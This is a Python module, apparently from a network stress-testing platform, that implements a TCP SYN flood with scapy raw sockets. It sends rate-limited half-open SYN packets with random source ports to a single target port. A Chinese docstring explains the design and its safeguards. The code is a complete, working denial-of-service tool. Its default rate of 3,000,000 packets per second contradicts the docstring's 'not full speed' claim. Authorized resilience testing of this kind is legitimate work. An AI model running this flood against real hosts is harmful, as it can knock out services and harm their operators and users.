"""
測項：TCP SYN Flood（埠流量衝擊，通用任意 TCP Port）
分類：一般（不限通訊協定）
底層實作：scapy 原生 raw socket，於單一緊迴圈中直接組包送出（不透過 hping3 CLI
subprocess）。

設計考量：相較於透過 hping3 CLI（subprocess）送出 SYN 封包的作法，原生迴圈可
避免下列問題：
  1. hping3 在高 pps 下預設逐包印出一行輸出，經由 run_subprocess() 即時寫檔
     ＋ WebSocket 廣播，龐大的 I/O/訊息量本身會拖慢控制迴圈；subprocess 模式下
     也多一層「送 SIGTERM 等子行程收尾」的不確定性（不同 hping3 版本/發行版
     對訊號的反應時間不一致）。
  2. 原生 Python + scapy 迴圈能讓「每一次迴圈都檢查 stop_event」，不經過任何
     子行程、不用等任何外部工具回應訊號，操作者按下「停止」或「跳過」的反應
     時間等同一個封包發送間隔（例如 3000pps 時 <1ms），避免測項在被要求停止後
     仍持續運作一段時間才真正結束。

跟 udp_flood.py / netlayer/icmp_echo_flood.py 採用同一種模式：原生 Python +
scapy 緊迴圈直接送包，RateLimiter 控速。

安全設計（比照本平台其他 scapy 測項一致的規範）：
  - 只用自己的來源 IP（不偽造來源位址／不做 IP Spoofing），來源 Port 隨機挑選
    （模擬多個不同的連線嘗試，比固定單一來源 Port 更貼近真實 SYN Flood 情境，
    同時避免作業系統對同一個 4-tuple 的封包做去重複/合併）。
  - 只送往 Orchestrator 傳入的單一 target:port，不會對其他位址/埠發送。
  - 速率透過 RateLimiter 嚴格控速，並非無上限全速；duration 經 clamp_duration()
    限制在 30 分鐘內。
  - 送出後「不」等待/處理回應（不完成三方交握），純粹是 SYN 半開流量衝擊測試。
需求：scapy，且需要 root 或 CAP_NET_RAW 權限才能送出 raw TCP 封包（跟平台其他
raw socket 測項要求一致，見 README「建議用 sudo 執行 run.sh」）。
"""
import random
import time

from ..common import RateLimiter, clamp_duration

NAME = "TCP SYN Flood（埠流量衝擊，原生 raw socket）"
CATEGORY = "一般"
PROTOCOL = "TCP"
TEST_TYPE = "traffic"  # 流量型：SYN 半開封包洪水，靠封包速率本身造成負擔


def get_param_schema() -> dict:
    return {
        "rate_pps": {"type": "int", "default": 3000000, "min": 1, "max": 3000000, "desc": "每秒送出封包數（pps）"},
        "payload_size": {"type": "int", "default": 40, "min": 0, "max": 1400, "desc": "TCP payload 大小（bytes，模擬非空封包）"},
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    try:
        from scapy.all import IP, TCP, Raw, send
    except ImportError:
        log_fn("[!] 未安裝 scapy，請先執行 pip install scapy")
        return {"packets_sent": 0, "error": "scapy not installed"}

    duration = clamp_duration(duration)
    rate = int(params.get("rate_pps", 4000))
    payload_size = int(params.get("payload_size", 40))
    payload = b"\x00" * payload_size if payload_size > 0 else b""

    limiter = RateLimiter(rate)
    sent, errors = 0, 0
    start = time.time()

    log_fn(f"[+] TCP SYN Flood -> {target}:{port} @ {rate}pps, {duration}s（原生 raw socket，不經 hping3）")
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        limiter.wait()
        sport = random.randint(1024, 65535)
        seq = random.randint(0, 0xFFFFFFFF)
        pkt = IP(dst=target) / TCP(sport=sport, dport=int(port), flags="S", seq=seq)
        if payload:
            pkt = pkt / Raw(load=payload)
        try:
            send(pkt, verbose=False)
            sent += 1
        except (PermissionError, OSError) as e:
            errors += 1
            if errors <= 5:
                log_fn(f"[!] 發送失敗（權限或路由問題）：{e}")
            if errors > 20:
                log_fn("[!] 連續發送失敗過多，提前中止（請確認以 sudo/root 執行、且有 CAP_NET_RAW 權限）")
                break

    log_fn(f"[+] 結束：已送出 {sent} 個 SYN 封包，失敗 {errors} 次")
    return {"packets_sent": sent, "errors": errors, "elapsed_sec": round(time.time() - start, 1)}
